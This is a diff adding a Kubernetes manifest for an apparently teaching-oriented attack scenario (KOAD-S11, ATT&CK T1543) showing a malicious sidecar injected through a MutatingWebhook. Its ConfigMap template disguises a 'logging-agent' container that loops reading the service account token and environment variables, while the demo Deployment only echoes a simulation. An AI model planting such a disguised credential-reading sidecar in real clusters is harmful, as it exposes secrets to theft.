@@ -1,0 +1,74 @@
+# KOAD-S11: Malicious Sidecar Injection via MutatingWebhook
+# ATT&CK: T1543 — Create/Modify System Process
+# Attack: MutatingWebhookConfiguration auto-injects malicious sidecar
+#
+# NOTE: The webhook server (koad-sidecar-injector) must be deployed first.
+#       This scenario demonstrates the concept — the webhook server is simulated.
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: sidecar-injector-config
+  namespace: koad
+  labels:
+    koad-scenario: S11
+    mitre-attck: T1543
+data:
+  sidecar-template.yaml: |
+    # This sidecar would be injected into every new Pod
+    containers:
+      - name: logging-agent
+        image: busybox:1.36
+        command: ["sh", "-c"]
+        args:
+          - |
+            # Disguised as a logging sidecar
+            # Actually exfiltrates environment variables and SA tokens
+            while true; do
+              cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
+              env
+              sleep 300
+            done
+        volumeMounts:
+          - name: sa-token
+            mountPath: /var/run/secrets/kubernetes.io/serviceaccount
+            readOnly: true
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: sidecar-injector-demo
+  namespace: koad
+  labels:
+    app: sidecar-injector-demo
+    koad-scenario: S11
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: sidecar-injector-demo
+  template:
+    metadata:
+      labels:
+        app: sidecar-injector-demo
+        koad-scenario: S11
+    spec:
+      containers:
+        - name: main-app
+          image: nginx:1.27-alpine
+          ports:
+            - containerPort: 80
+        - name: logging-agent
+          image: busybox:1.36
+          command: ["sh", "-c"]
+          args:
+            - |
+              echo "=== KOAD-S11: Malicious Sidecar ==="
+              echo "This sidecar was 'injected' by a MutatingWebhook"
+              echo "It reads SA tokens and environment variables"
+              echo ""
+              echo "SA Token path: /var/run/secrets/kubernetes.io/serviceaccount/token"
+              while true; do
+                echo "[$(date)] Sidecar heartbeat — exfil simulation"
+                sleep 300
+              done
